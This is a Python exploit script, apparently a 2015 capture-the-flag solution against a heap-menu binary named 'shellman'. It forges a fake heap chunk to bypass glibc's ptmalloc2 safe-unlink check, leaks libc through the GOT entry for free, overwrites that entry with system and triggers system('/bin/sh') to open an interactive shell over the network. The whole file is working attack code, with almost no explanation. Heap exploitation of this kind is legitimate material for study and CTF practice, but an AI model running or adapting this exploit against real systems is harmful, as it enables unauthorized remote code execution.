from struct import *
from sys import *
from time import *
from traceback import *
from zio import *

#
#
#   random  @ 2015-06-01
#
#   bypass ptmalloc2 safe-unlink
#
#
#
def pwn(target, shell=False):
    io = ''
    try:
        io = zio(target, timeout=50, print_read=False, print_write=False)
        if not io:
            print("Can't load zio module!")
            exit(-1)
    except : #socket.timeout
        print "can't connect server!"
        return ''

    def newsc(size, sc):
        assert size-1 <= 1023
        #io.read_until('> ')
        io.writeline('2')
        io.read_until('Length of new shellcode: ')
        io.writeline(str(size))
        io.read_until('Enter your shellcode(in raw format): ')
        io.writeline(sc) 
        
    def editsc(no, size, sc):
        assert size-1 <= 1023
        #io.read_until('> ')
        io.writeline('3')
        io.read_until('Shellcode number:')
        io.writeline(str(no))
        io.read_until('Length of shellcode:')
        io.writeline(str(size))
        io.read_until('Enter your shellcode:')
        io.writeline(sc) 

    def delsc(no):
        #io.read_until('> ')
        io.writeline('4')
        io.read_until('Shellcode number:')
        io.writeline(str(no))

    def showsc():
        #io.read_until('> ')
        io.writeline('1')
        result = io.read_until('SHELLC0DE 3:')
        #result = io.read()
        return result
    
    newsc(128,'0'*128)
    newsc(128,'1'*128)
    newsc(128,'2'*128)
    newsc(128,'3'*128)      #target
    newsc(128,'4'*128)
    newsc(128,'5'*128)      
    prev_size = pack('<q',0x00)
    size = pack('<q',0x81)
    fd = pack('<q',0x601700)
    bk = pack('<q',0x601700+8)
    fakechunk =  prev_size + size + fd + bk
    payload = fakechunk + '8' * (128 - len(fakechunk)) + pack('<q',0x80) + pack('<q',0x90)
    editsc(3, len(payload), payload)
    delsc(4)

    #leak libc
    got_free = pack('<q',0x601600)
    editsc(3, len(got_free), got_free)
    result = showsc()
    idx = result.find('SHELLC0DE 2: ') + len('SHELLC0DE 2: ')
    free = l64(result[idx:idx+16].decode('hex'))   
    print 'free = %s ' % hex(free)
    system = l64(free - 0x3c7b0)
    print 'system = %s ' % hex(l64(system))
    
    # overwrite got_free as system 
    editsc(2, len(system), system)

    #system("/bin/sh")
    editsc(0, 8, "/bin/sh\x00")
    delsc(0)

    io.interact()


#################################################

local = './shellman'
host = ('192.168.43.155',10002)
if __name__ == '__main__':
    target = local
    target = host
    pwn(target, shell=True)

